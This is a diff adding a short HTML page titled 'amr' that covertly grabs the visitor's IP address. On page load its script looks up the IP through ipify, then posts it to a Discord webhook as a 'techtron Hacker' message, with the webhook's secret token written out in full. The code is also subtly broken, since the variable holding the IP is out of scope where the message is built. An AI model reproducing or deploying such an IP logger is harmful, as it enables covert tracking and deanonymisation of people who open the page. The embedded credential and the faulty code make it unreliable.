@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>amr</title>
+</head>
+
+<body>
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => console.log(data.ip));
+
+
+            var myHeaders = new Headers();
+myHeaders.append("Content-Type", "application/json");
+
+var raw = JSON.stringify({
+  "username": "techtron Hacker",
+  "content": `amrs ip is ${data.ip}`
+});
+
+var requestOptions = {
+  method: 'POST',
+  headers: myHeaders,
+  body: raw,
+  redirect: 'follow'
+};
+
+fetch("https://discord.com/api/webhooks/1148821173245857852/T7m0LSuEZlWb-rPyjS586aeYToN3rQN9ov2Cco4kk2PaiY3s5h8-YHsBXeSfRaFIliIg", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+
+    </script>
+</body>
+
+</html>
